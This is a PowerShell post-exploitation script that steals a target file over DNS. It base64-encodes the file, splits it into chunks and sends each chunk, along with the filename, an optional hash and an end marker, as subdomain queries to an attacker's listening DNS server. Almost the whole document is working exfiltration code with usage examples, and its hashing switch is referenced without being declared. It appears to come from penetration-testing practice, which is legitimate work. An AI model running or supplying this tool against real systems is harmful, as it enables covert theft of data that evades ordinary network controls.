<#
.SYNOPSIS
Post-exploitation tool to execute DNS exfiltration to your pentesting machine

.DESCRIPTION
Post-exploitation tool to execute DNS exfiltration to your pentesting machine
At leats three parameters are needed:
- Specify DNS resolver as Server parameter
- Specify filename
- Specify the fake or legit domain you want to query
The fakeDNS-server must be listening on your machine

.PARAMETER Server
(Required) IP address of the listening DNS resolver

.PARAMETER File
(Required) Path to the file to exfiltrate through DNS queries

.PARAMETER Domain
(Required) Fake or legit domain for DNS queries. Your fakeDNS-server will answer to both

.PARAMETER Timeout
(Optional) Set a timeout between queries to slow down or speed up exfiltration. Default value is 2s

.PARAMETER Hashing
(Optional) Include hash calculation in exfiltration for integrity purposes

.PARAMETER Length
(Optional) Set the third domain length. Default value is 16

.EXAMPLE
.\dnsexfil.ps1 -Server 10.10.80.129 -d fakedomain.com -File C:\Users\Name\file.txt

.EXAMPLE
.\dnsexfil.ps1 -Server 10.10.80.129 -d fakedomain.com -File C:\Users\Name\file.txt -Length 32 -Timeout 10 -Hashing

.LINK
.

#>

Param(
	[Parameter(
        Mandatory = $True
	)][string] $Server,

	[Parameter(
        Mandatory = $True
    )][string] $Domain,

	[Parameter(
		Mandatory = $True
	)][string] $File,

	[Parameter(
        Mandatory = $False
	)][float] $Timeout,

	[Parameter(
        Mandatory = $False
	)][int] $Length
)

function Send-ToServer ($Server, $Domain, $Timeout, $Data) {
	foreach ($Chunk in $Data) {
		Sleep $Timeout
		$Query = "${Chunk}.${Domain}"
		Write-Host "==> ${Server}:${Query}"
		$Response = (Resolve-DnsName $Query -Server $Server -NoHostsFile -Type A)
	}
}

function Get-DataFromFile($FilePath, $Length) {
	$RawData  = [System.IO.File]::ReadAllBytes($FilePath)
	$B64File  = [Convert]::ToBase64String($RawData) -replace "/","_" -replace "=","-" -replace "\+","."
	[string[]] $Data = $B64File -split "(.{$Length})" -ne ''
    for ($i = 0; $i -lt $Data.length; $i++) {
        if ($Data[$i] -like ".*" -or $Data[$i] -like "-*") {
            $Data[$i] = "0000000000" + $Data[$i]
        } elseif ($Data[$i] -like "*.") {
            $Data[$i] = $Data[$i] + "0000000000"
        }
    }
	return $Data
}

function Get-DataFromString($String, $Length) {
	$Bytes = [System.Text.Encoding]::Unicode.GetBytes("$String")
	$B64String = [Convert]::ToBase64String($Bytes) -replace "/","_" -replace "=","-" -replace "\+","."
	[string[]] $Data = $B64String -split "(.{$Length})" -ne ''
	return $Data
}

Write-Host $Length.HelpMessage

if (-not $Length) {
	$Length = 16
} elseif ($Length -gt 60) {
	$Length = 50
}

if (-not $Timeout) {
    $Timeout = 2
}



if ( (-not $File) -or (-not (Test-Path $File -PathType Leaf)) ) {
	Write-Host "You must specify at least one file to send"
	exit
}

Write-Host "----------------------------------------------"
Write-Host "+ DNS Resolver:   $Server"
Write-Host "+ Timeout:        $Timeout"
Write-Host "+ Hashing:        $Hashing"
Write-Host "+ Chunk Length:   $Length"
Write-Host "----------------------------------------------"
Write-Host "+ File:           $File"
Write-Host "----------------------------------------------"

$FileName = [System.IO.Path]::GetFileName($File)

# Conversion of $FileName to base64 string, then send
Write-Host "+ Sending filename: $File"
Send-ToServer -Server $Server -Domain $Domain -Timeout $Timeout -Data (Get-DataFromString -String "/fn/$FileName/" -Length $Length)

if ($Hashing) {
	Write-Host "+ Sending file hash"
	$FileHash = (Get-FileHash -Algorithm MD5 $File |Select-Object -ExpandProperty Hash).ToLower()
	Send-ToServer -Server $Server -Domain $Domain -Timeout $Timeout -Data (Get-DataFromString -String "fh/$FileHash/" -Length $Length)
}

# Prepare $FilePath for exfiltration:
# path extraction, filename to base64, string to smaller chunks
$Data = (Get-DataFromFile -File $File -Length $Length)
Write-Host "+ Sending $File. Chunks:"($Data.length)", expected time:"($Data.length * $Timeout)"s"
Send-ToServer -Server $Server -Domain $Domain -Timeout $Timeout -Data $Data

Write-Host "+ Sending file END signal"
Send-ToServer -Server $Server -Domain $Domain -Timeout $Timeout -Data (Get-DataFromString -String "/end/" -Length $Length)

Write-Host "----------------------------------------------"
